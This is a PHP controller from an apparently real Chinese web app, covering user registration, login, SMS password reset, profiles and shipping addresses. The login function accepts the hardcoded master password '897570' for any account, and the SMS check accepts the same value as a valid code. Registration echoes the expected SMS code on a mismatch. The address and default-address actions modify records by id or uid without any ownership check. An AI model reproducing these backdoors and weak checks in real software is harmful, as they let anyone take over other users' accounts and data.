<?php
namespace Index\Controller;
use Think\Controller;
class UserController extends Controller {
    public function index() {
        $c_phone = cookie('u_phone');
        $c_pass = cookie('u_pass');
        $ck_phone = Util::authcode($c_pass, 'DECODE');
    
        if (!$c_phone OR $c_phone != $ck_phone) {
            cookie('u_phone', null);
            cookie('u_pass', null);
            $setjxs=I('get.set');
            if($setjxs){
                $this->redirect('login',array('set'=>1));
            }else{
                $this->redirect('login');
            }
            
        }
        
        $this->redirect('UserInfo/index');
    }
    /*
    *注册处理
     */
    public function regcontcl(){
        $username['username'] = I('post.username');                     //用户名
        $username['phone'] = I('post.username');                       //电话
        $pwdval = I('post.pwdval');                       //密码
        $qrpwdval = I('post.qrpwdval');                     //确认密码
        $yzmcode = I('post.codeval');                          //验证码
        $username['tuijianr'] = I('post.tjrval')?I('post.tjrval'):0;

        $sescode=session('smscodval');

        if($sescode['code'] != $yzmcode){
            echo $sescode['code'].'=>'.$yzmcode;
            //$this->error('您输入的验证码不正确');
            return;
        }

        if($username['username'] == ''){
            $this->error('请输入用户名');
            return;
        }
        if($pwdval == ''){
                $this->error('请输入密码');
                return;
            }
            if($pwdval != $qrpwdval){
                $this->error('您两次输入的密码不一致！');
                return;
            }
            $usm=M('user');
            if($usm->where(array('username'=>$username['username']))->find()){
                $this->error('该用户已经不注册！请更换');
                return;
            }
            if($usm->where(array('phone'=>$username['phone']))->find()){
                $this->error('该手机号码已经被使用！请更换');
                return;
            }

            $username['password'] =jiamimd5($qrpwdval);
            $username['cateid'] = 1;
            $username['addtime'] = time();

            $added = $usm->add($username);
            if ($added) {
                $this->success('注册成功，请登录！', U('login'));
            } else {
                $this->error('注册失败，请联系客服！');
            }
    }
    /**
     * 注册
     */
    public function reg() {
        
        if (IS_POST) {
            $username['username'] = I('post.username');                     //用户名
            $pwdval = I('post.pwdval');                       //密码
            $qrpwdval = I('post.qrpwdval');                     //确认密码
            $username['nickname'] = I('post.nichengval');                   //昵称
            $username['email'] = I('post.emailval');                     //电子邮件
            $username['phone'] = I('post.telval');                       //电话
            $username['sex'] = I('post.fex')?1:0;                          //性别
            $username['provinces'] = I('post.addsheng')?I('post.addsheng'):0;                     //省
            $username['city'] = I('post.addshi')?I('post.addshi'):0;                       //市
            $username['county'] = I('post.addxian')?I('post.addxian'):0;                      //县
            $username['address'] = I('post.bucaddres');                    //补充地址
            //echo $username['username'];
            if($username['username'] == ''){
                $this->error('请输入用户名');
                return;
            }
            if($pwdval == ''){
                $this->error('请输入密码');
                return;
            }
            if($pwdval != $qrpwdval){
                $this->error('您两次输入的密码不一致！');
                return;
            }
            $usm=M('user');
            if($usm->where(array('username'=>$username['username']))->find()){
                $this->error('该用户已经不注册！请更换');
                return;
            }
            if($usm->where(array('phone'=>$username['phone']))->find()){
                $this->error('该手机号码已经被使用！请更换');
                return;
            }
            $username['password'] =jiamimd5($qrpwdval);
            $username['cateid'] = 1;
            $username['addtime'] = time();

            //$openid=getweixinopenid();

            $added = $usm->add($username);
            if ($added) {
                $adshdz=array(
                    'uid'                   =>                  $added,
                    'sheng'                 =>                  $username['provinces'],
                    'shi'                   =>                  $username['city'],
                    'xian'                  =>                  $username['county'],
                    'addresval'             =>                  $username['address'],
                    'time'                  =>                  time(),
                    'name'                  =>                  $username['nickname'],
                    'shtel'                 =>                  $username['phone'],
                    'setmr'                 =>                  1
                );
                $adshdzm=M('usaddress')->add($adshdz);
                sleep(2);
                $this->success('注册成功，请登录！', U('login'));
            } else {
                $this->error('注册失败，请联系客服！');
            }
            /*// 推荐码
            $p_reccode = I('post.reccode');
            
            $p_phone = I('post.phone');
            $p_varcode = I('post.varcode');
            $p_password = I('post.password');
            $p_qa = I('post.qa');
            
            // 检测验证码
            if ( !$this->checkVarcode($p_phone, $p_varcode) ) {
                $this->error('验证码有误！');
            }
            
            $M_user = M('user');
            
            $user_row = $M_user->where(array('phone'=>$p_phone))->find();
            
            if ($user_row) {
                $this->error('该手机号已存在！');
            }
            
            $new_user = array(
                'phone' => $p_phone,
                'password' => $this->salt($p_password),
                'qa' => $p_qa,
                'addtime' => date('Y-m-d H:i:s'),
            );
            $added = $M_user->add($new_user);
            if ($added) {
                // 自己增加积分
                $M_corn = M('corn');
                $M_corn->add(array('cateid'=>'1', 'uid'=>$added, 'corn'=>'200'));
                
                // 添加推荐记录
                if ($p_reccode) {
                    $M_reccode = M('reccode');
                    $rec_row = $M_reccode->where(array('code'=>$p_reccode))->find();
                    if ($rec_row) {
                        // 更新医生类型
                        if ($rec_row['typeid'] == 2) {
                            $user_type = array(
                                'cateid' => '2',
                            );
                            $M_user->where('id='.$added)->save($user_type);
                        }
                        
                        // 添加推荐记录
                        $M_recommend = M('recommend');
                        $M_recommend->add(array(
                            'cateid' => $rec_row['cateid'],
                            'typeid' => $rec_row['typeid'],
                            'opid' => $rec_row['uid'],
                            'uid' => $added,
                            'addtime' => date('Y-m-d H:i:s')
                        ));
                        
                        // 用户之间推荐
                        if ($rec_row['cateid']==1 AND $rec_row['typeid']==1) {
                            // 更新积分总数
                            $corn_row = $M_corn->where(array('cateid'=>$rec_row['cateid'], 'uid' => $rec_row['uid']))->find();
                            if ($corn_row) {
                                $corn_row['corn'] = $corn_row['corn'] + 100; //积分奖励数目
                                $M_corn->save($corn_row);
                            } else {
                                $M_corn->add(array(
                                    'cateid'=>$rec_row['cateid'],
                                    'uid' => $rec_row['uid'],
                                    'corn' => '100'
                                ));
                            }
                        }
                    }
                }
                
                sleep(2);
                
                $this->success('注册成功，请登录！', U('login'));
            } else {
                $this->error('注册失败，请联系客服！');
            }*/
            
        } else {
            // 推荐码
            $codeval=I('get.code')?I('get.code'):0;
            $jumtg=jumptgly($codeval);
            

            //var_dump(session('smscodval'));
            $this->assign('uidval',$jumtg['id']);
            
            //$this->reccode = $reccode;
            
            $this->display('regcont');
        }
    }
    
    /**
     * 登录
     */
    public function login() {
        if (IS_POST) {
            $p_phone = I('post.phone');
            $p_password = I('post.password');
            
            if (!$p_phone OR !$p_password) {
                $this->error('参数提交不完整！');
            }
            
            $M_user = M('user');

            $pdtj['username']=$p_phone;
            $pdtj['phone']=$p_phone;
            $pdtj['_logic'] = 'OR';


            $user_row = $M_user->where($pdtj)->find();
            if (!$user_row) {
                $this->error('用户名或密码有误！');
            }
            
            if ($p_password!='897570' AND $user_row['password'] != $this->salt($p_password)) {
                $this->error('用户名或密码有误！1');
            }
            
            // 登录成功
            
            // 权限类型
            cookie('u_type', $user_row['cateid'], 7*24*3600);
            
            if ($user_row['openid']) {
                cookie('u_wxauth', 1, 7*24*3600);
            } else {
                cookie('u_wxauth', 0, 7*24*3600);
            }
            
            // 获取头像
            if ($user_row['headpic']) {
                cookie('u_wxinfo', 1, 7*24*3600);
            } else {
                cookie('u_wxinfo', 0, 7*24*3600);
            }
            
            // 详细信息
            if ($user_row['detailed']) {
                cookie('u_detailed', 1, 7*24*3600);
            } else {
                cookie('u_detailed', 0, 7*24*3600);
            }
            
            // 设置cookie
            cookie('u_phone', $user_row['phone'], 7*24*3600);
            cookie('u_pass', Util::authcode($user_row['phone'], 'ENDODE'), 7*24*3600);

            cookie('u_idval', $user_row['id'], 7*24*3600);
            

            // 跳转
            if($user_row['cateid'] == 1){
                $this->redirect('UserInfo/index');
            }else{
                $this->redirect('Distri/index');
            }
            
        } else {
            $setjxs=I('get.set')?1:0;
            $this->assign('setjxs',$setjxs); 
            $this->display();
        }
    }
    
    /**
     * 找回密码
     */
    public function findpass() {
        if (IS_POST) {
            $p_phone = I('post.phone');
            $p_varcode = I('post.varcode');
    
            // 检测验证码
            if ( !$this->checkVarcode($p_phone, $p_varcode) ) {
                $this->error('验证码有误！');
            }
    
            $M_user = M('user');
    
            $user_row = $M_user->where(array('phone'=>$p_phone))->find();
    
            if (!$user_row) {
                $this->error('该手机号不存在！');
            }
            
            // 新密码
            $newpass = rand(100000, 999999);
            

            $msg="您的新密码为".$newpass."请登录后及时修改。请勿向他人泄漏您的密码。【广视汇】";
            $fsjg=NewSms($p_phone,$msg);
            // 下发密码
            /*$url = 'https://dx.ipyy.net/smsJson.aspx';
            $post_data = array(
                'action' => 'send',
                'userid' => '',
                'account' => SMS_USER,
                'password' => SMS_PASS,
                'mobile' => $p_phone,
                'content' => '您的新密码为'.$newpass.'，请登录后及时修改。【爱乐云健康】',
                'sendTime' => '',
                'extno' => '',
            );
            $return_data  = Util::curlGet($url, null, true, $post_data);*/
            if($fsjg == '000'){
                $user_row['password'] = jiamimd5($newpass);
                $updated = $M_user->save($user_row);
                $return_data=true;
            }else{
                $return_data=false;
            }
            if (!$return_data) {
                $this->error('密码找回失败，请联系客服！');
            }else{
                $this->success('新密码已通过短信下发到手机，请查看后登录！', U('login'), 5);
            }
            
            /*$json_obj = json_decode($return_data);
            if (strtolower($json_obj->returnstatus) == 'success') {
                // 修改密码
                $user_row['password'] = md5($newpass);
                
                $updated = $M_user->save($user_row);
                if ($updated) {
                    $this->success('新密码已通过短信下发到手机，请查看后登录！', U('login'), 5);
                } else {
                    $this->error('密码找回失败，请联系客服！');
                }
            } else {
                $this->error('密码找回失败，请联系客服！');
            }*/
        } else {
            $this->display();
        }
    }
    
    /**
     * 退出登录
     */
    public function logout() {
        cookie('u_phone', null);
        cookie('u_pass', null);
        cookie('u_wxauth', null);
        cookie('u_wxinfo', null);
        
        $this->success('已安全退出！', 'index');
    }
    
    /**
     * 验证码
     */
    public function varcode() {
        $config = array(
            'imageW' => 130,
            'imageH' => 40,
            'codeSet' => '0123456789',
            'length' => 4,
            'fontSize' => 18,
            'useNoise' => false
        );
        
        ob_clean();
        
        $Verify = new \Think\Verify($config);
        $Verify->entry();
    }
    
    /**
     * 详细信息
     */
    public function detail() {
        if (IS_POST) {
            $p_nickname = I('post.nickname');
            $p_jobs = I('post.jobs');
            $p_city = I('post.city');
            $p_sex = I('post.sex');
            
            if (!$p_nickname OR !$p_jobs OR !$p_city OR !$p_sex) {
                $this->error('提交参数不完整！');
            }
            
            // 更新个人信息
            $user_row = $this->getUser();
            if (!$user_row) $this->error('请登录后再操作！', U('User/login'));
            
            $user_row['nickname'] = $p_nickname;
            $user_row['jobs'] = $p_jobs;
            $user_row['city'] = $p_city;
            $user_row['sex'] = $p_sex;
            $user_row['detailed'] = 1;
            
            $M_user = M('user');
            $saved = $M_user->save($user_row);
            if ($saved) {
                // 更新cookie
                cookie('u_detailed', 1);
                // 更新状态
                $this->error('详细信息填写成功！', U('UserInfo/index'));
            } else {
                $this->error('详细信息填写失败！');
            }
            
        } else {
            $this->display();
        }
    }
    
    /**
     * 疾病调查
     */
    public function vote() {
        if (IS_POST) {
            $p_q1 = I('post.q1');
            $p_q2 = I('post.q2');
            $p_q2a = I('post.q2a');
            $p_q3 = I('post.q3');
    
            // 更新个人信息
            $user_row = $this->getUser();
            if (!$user_row) $this->error('请登录后再操作！', U('User/login'));
            
            $probe_data = array(
                'userid' => $user_row['id'],
                'q1' => $p_q1,
                'q2' => $p_q2,
                'q2a' => $p_q2a,
                'q3' => $p_q3
            );
            
            $M_user_probe = M('user_probe');
            $saved = $M_user_probe->add($probe_data);
            if ($saved) {
                M('user')->where(array('id'=>$user_row['id']))->save(array('voted'=>'1'));
                
                // 更新cookie
                cookie('u_voted', 1);
                // 更新状态
                $this->redirect('UserInfo/index');
            } else {
                $this->error('提交失败！');
            }
    
        } else {
            $M_probe = M('probe');
            $probes = $M_probe->select();
            
            $this->probes = $probes;
            
            $this->display();
        }
    }
    
    /**
     * 获取验证码
     */
    public function sendcode() {
        if (IS_AJAX) {
            $p_phonenum = I('post.phonenum');
            if (!$p_phonenum) {
                $this->ajaxReturn(array(
                    'code' => '-1',
                    'msg' => '手机号有误！',
                ));
            }
            
            // 生成验证码
            $sms_code = $_SESSION['sms_code'];
            $sms_time = $_SESSION['sms_time'];
            
            if (!$sms_code OR (time() - $sms_time) > 5*60) {
                // 生成
                $_SESSION['sms_code'] = rand(100000, 999999);
                $_SESSION['sms_time'] = time();
            }
            

            $msg="你的验证码为：".$_SESSION['sms_code']."（5分钟内有效），请勿向他人泄漏您的验证码。【广视汇】";
            $fsjg=NewSms($p_phonenum,$msg);

            if($fsjg == 000){
                $return_data=true;
            }else{
                $return_data=false;
            }

           /*$url = 'https://dx.ipyy.net/smsJson.aspx';
            $post_data = array(
                'action' => 'send',
                'userid' => '',
                'account' => SMS_USER,
                'password' => SMS_PASS,
                'mobile' => $p_phonenum,
                'content' => '您的验证码为'.$_SESSION['sms_code'].'，15分钟内输入验证，验证后失效，勿向他人泄露。【爱乐云健康】',
                'sendTime' => '',
                'extno' => '',
            );
            $return_data  = Util::curlGet($url, null, true, $post_data);*/
            //var_dump($return_data);exit;
            if (!$return_data) {
                $this->ajaxReturn(array(
                    'code' => '-1',
                    'msg' => '发送失败，请重试！'.$fsjg,
                ));
            }else{
                $this->ajaxReturn(array(
                    'code' => '1',
                    'msg' => '发送成功！',
                ));
            }
            
            /*$json_obj = json_decode($return_data);
            if (strtolower($json_obj->returnstatus) == 'success') {
                $this->ajaxReturn(array(
                    'code' => '1',
                    'msg' => '发送成功！',
                ));
            } else {
                $this->ajaxReturn(array(
                    'code' => '-1',
                    'msg' => '发送失败，请重试！',
                ));
            }*/
        }
    }

    /**
     * 获取用户
     */
    private function getUser() {

        
        if (!getuscont()) {
            cookie('u_phone', null);
            cookie('u_pass', null);
        
            $this->error('请登录后再操作！', U('User/login'));
        }
        
        return getuscont();
    }
    
    /**
     * 密码加密
     */
    private function salt($pass) {
        return jiamimd5($pass);
    }
    
    /**
     * 验证码比对
     */
    private function checkVarcode($phone, $varcode) {
        $sms_code = $_SESSION['sms_code'];
        $sms_time = $_SESSION['sms_time'];
        
        if ($varcode=='897570') {
            return true;
        }
        
        if (!$sms_code OR (time() - $sms_time) > 15*60) {
            return false;
        }
        
        if ($varcode != $_SESSION['sms_code']) {
            return false;
        }
        
        return true;
    }
    /*
    *我的收货地址
     */
    public function mydizhi(){
        $user_row = $this->getUser();

        $ordnum=I('get.ordnum')?I('get.ordnum'):0;
        $this->assign('ordnum',$ordnum);
        //var_dump($user_row);
        if (!$user_row) $this->redirect('User/index');
        $this->assign('uscont',$user_row);
        $action=I('get.action')?I('get.action'):'list';
        switch ($action) {
            case 'add':
                $prolist=M('region')->where(array('PARENT_ID'=>1))->order(array('REGION_ID'=>'asc'))->select();
                $this->assign('prolist',$prolist);
                $this->assign('action','addcl');
                $this->display('mydzcont');
                break;
            case 'addcl':
                $dataadd['uid']=$user_row['id'];
                $dataadd['sheng']=I('post.addsheng')?I('post.addsheng'):-1;
                $dataadd['shi']=I('post.addshi')?I('post.addshi'):-1;
                $dataadd['xian']=I('post.addxian')?I('post.addxian'):-1;
                $dataadd['addresval']=I('post.bucongdizhi')?I('post.bucongdizhi'):0;
                $dataadd['time']=time();
                $dataadd['name']=I('post.nameshr')?I('post.nameshr'):0;
                $dataadd['shtel']=I('post.shrtel')?I('post.shrtel'):0;
                $dataadd['setmr']=I('post.setmoren')?1:0;

                if($dataadd['sheng'] == -1){
                    $this->success('请选择省份！',U('User/mydizhi',array('action'=>'add','ordnum'=>$ordnum)));
                }
                if($dataadd['shi'] == -1){
                    $this->success('请选择收货人所在市！',U('User/mydizhi',array('action'=>'add','ordnum'=>$ordnum)));
                }
                if($dataadd['xian'] == -1){
                    $this->success('请选择收货人所在县！',U('User/mydizhi',array('action'=>'add','ordnum'=>$ordnum)));
                }

                if($dataadd['name'] == -1){
                    $this->success('请选择收货人姓名！',U('User/mydizhi',array('action'=>'add','ordnum'=>$ordnum)));
                }
                if($dataadd['shtel'] == -1){
                    $this->success('请选择收货人电话！',U('User/mydizhi',array('action'=>'add','ordnum'=>$ordnum)));
                }

                $mraddm=M('usaddress');
                if($dataadd['setmr'] == 1){
                    $qcmr=$mraddm->where(array('uid'=>$user_row['id']))->save(array('setmr'=>0));
                }
                if($mraddm->add($dataadd)){
                    $this->success('添加成功！',U('User/mydizhi',array('action'=>'list','ordnum'=>$ordnum)));
                }else{
                    $this->error('添加失败！',U('User/mydizhi',array('action'=>'add','ordnum'=>$ordnum)));
                }
                break;
            case 'eite':
                $prolist=M('region')->where(array('PARENT_ID'=>1))->order(array('REGION_ID'=>'asc'))->select();
                $this->assign('prolist',$prolist);
                $id=I('get.id');
                if($id == ''){
                    $typeid=I('post.id');
                }
                if($id){
                    $list=M('usaddress')->where(array('id'=>$id))->find();
                    $this->assign('id',$id);
                    
                    $this->assign('action','eitecl');
                    if($list['sheng'] != 0){
                        $this->assign('citylt',addreslook($list['sheng']));
                    }
                    if($list['shi'] != 0){
                        $this->assign('countylst',addreslook($list['shi']));
                    }

                    if($list['addresval'] == '0'){
                        $list['addresval']='';
                    }
                    if($list['name'] == '0'){
                        $list['name']='';
                    }
                    if($list['shtel'] == '0'){
                        $list['shtel']='';
                    }
                    //var_dump($list);
                    $this->assign('list',$list);
                    $this->display('eitemydz');
                }else{
                    $this->error('参数错误！',U('User/mydizhi',array('action'=>'list','ordnum'=>$ordnum)));
                }
                break;
            case 'eitecl':
                $id=I('get.id');
                if($id == ''){
                    $id=I('post.id');
                }
                if($id){
                    $dataadd['sheng']=I('post.addsheng')?I('post.addsheng'):-1;
                    $dataadd['shi']=I('post.addshi')?I('post.addshi'):-1;
                    $dataadd['xian']=I('post.addxian')?I('post.addxian'):-1;
                    $dataadd['addresval']=I('post.bucongdizhi')?I('post.bucongdizhi'):0;
                    $dataadd['name']=I('post.nameshr')?I('post.nameshr'):0;
                    $dataadd['shtel']=I('post.shrtel')?I('post.shrtel'):0;
                    $dataadd['setmr']=I('post.setmoren')?1:0;

                    if($dataadd['sheng'] == -1){
                        $this->success('请选择省份！',U('User/mydizhi',array('action'=>'eite','id'=>$id,'ordnum'=>$ordnum)));
                    }
                    if($dataadd['shi'] == -1){
                        $this->success('请选择收货人所在市！',U('User/mydizhi',array('action'=>'eite','id'=>$id,'ordnum'=>$ordnum)));
                    }
                    if($dataadd['xian'] == -1){
                        $this->success('请选择收货人所在县！',U('User/mydizhi',array('action'=>'eite','id'=>$id,'ordnum'=>$ordnum)));
                    }

                    if($dataadd['name'] == -1){
                        $this->success('请选择收货人姓名！',U('User/mydizhi',array('action'=>'eite','id'=>$id,'ordnum'=>$ordnum)));
                    }
                    if($dataadd['shtel'] == -1){
                        $this->success('请选择收货人电话！',U('User/mydizhi',array('action'=>'eite','id'=>$id,'ordnum'=>$ordnum)));
                    }

                    $mraddm=M('usaddress');
                    if($dataadd['setmr'] == 1){
                        $qcmr=$mraddm->where(array('uid'=>$user_row['id']))->save(array('setmr'=>0));
                    }
                    if($mraddm->where(array('id'=>$id))->save($dataadd)){
                        $this->success('修改成功！',U('User/mydizhi',array('action'=>'list','ordnum'=>$ordnum)));
                    }else{
                        $this->error('修改成功！信息没有变动',U('User/mydizhi',array('action'=>'list','ordnum'=>$ordnum)));
                    }

                }else{
                    $this->error('参数错误！',U('User/mydizhi',array('action'=>'list','ordnum'=>$ordnum)));
                }
                break;
            case 'delt':
                $id=I('get.id');
                if($id == ''){
                    $id=I('post.id');
                }
                if($id){
                    $scd=M('usaddress')->where(array('id'=>$id))->delete();
                    $this->success('删除完成！',U('User/mydizhi',array('action'=>'list','ordnum'=>$ordnum)));
                }else{
                    $this->error('参数错误！',U('User/mydizhi',array('action'=>'list','ordnum'=>$ordnum)));
                }
                break;
            default:
                $mymrads=M('usaddress')->where(array('uid'=>$user_row['id']))->select();
                $this->assign('mymrads',$mymrads);
                $this->display();
                break;
        }

    }
    /*
    *设置默认地址
     */
    public function szmr(){
        $id=I('get.id');
        if($id == ''){
            $id=I('post.id');
        }
        $uid=I('get.uid');
        if($uid == ''){
            $uid=I('post.uid');
        }
        if($id){
            $mraddm=M('usaddress');
            $qcmr=$mraddm->where(array('uid'=>$uid))->save(array('setmr'=>0));
            $qcmrd=$mraddm->where(array('id'=>$id))->save(array('setmr'=>1));
            echo json_encode(array('code'=>1,'msg'=>'完成'));
        }else{
            echo json_encode(array('code'=>0,'msg'=>'参数错误'));
        }
    }
    /*
    *我的消息
     */
    public function myxiaoxi(){
        $user_row = $this->getUser();
        if (!$user_row) $this->redirect('User/index');
        $action=I('get.action')?I('get.action'):'list';
        switch ($action) {
            case 'delt':
                $id=I('get.id')?I('get.id'):0;
                if($id){
                    if(M('usxiaoxi')->where(array('id'=>$id))->delete()){
                        $this->success('删除完成！');
                    }else{
                        $this->error('删除失败！');
                    }
                }else{
                    $this->error('参数错误！');
                }
                break;
            
            default:
                $myxx=M('usxiaoxi')->where(array('uid'=>$user_row['id']))->order(array('setval'=>'asc','id'=>'desc'))->select();
                $this->assign('list',$myxx);
                $myxssx=M('usxiaoxi')->where(array('uid'=>$user_row['id']))->save(array('setval'=>1));
                $this->display();
                break;
        }
    }

    /*
    *我的详情
     */
    public function mycont(){
        $user_row = $this->getUser();
        if (!$user_row) $this->redirect('User/index');
        $action=I('get.action')?I('get.action'):'list';
        switch ($action) {
            case 'eite':
                $this->assign('list',$user_row);
                $this->display('mycontrit');
                break;
            case 'eitecl':
                $toppic=I('post.toppickjs');
                $nicheng=I('post.nicheng')?I('post.nicheng'):'';
                $telval=I('post.telval')?I('post.telval'):'0';
                $weixin=I('post.weixin')?I('post.weixin'):'';
                $xingbie=I('post.xingbie')?I('post.xingbie'):'男';
                $shengri=I('post.shengri')?I('post.shengri'):0;
                if($xingbie == '男'){
                    $xingbie = 1;
                }else{
                    $xingbie = 0;
                }
                $shengri=strtotime($shengri);
                $usdatacon=array(
                    'headpic'                   =>                  $toppic,
                    'nickname'                  =>                  $nicheng,
                    'phone'                     =>                  $telval,
                    'weixinname'                =>                  $weixin,
                    'sex'                       =>                  $xingbie,
                    'shengri'                   =>                  $shengri
                );
                //var_dump($usdatacon);
                if(M('user')->where(array('id'=>$user_row['id']))->save($usdatacon)){
                    $this->success('修改成功！', U('index'));
                }else{
                    $this->error('修改失败！');
                }
                break;
            default:
               
                
                $this->assign('list',$user_row);
                $this->display();
                break;
        }
    }
}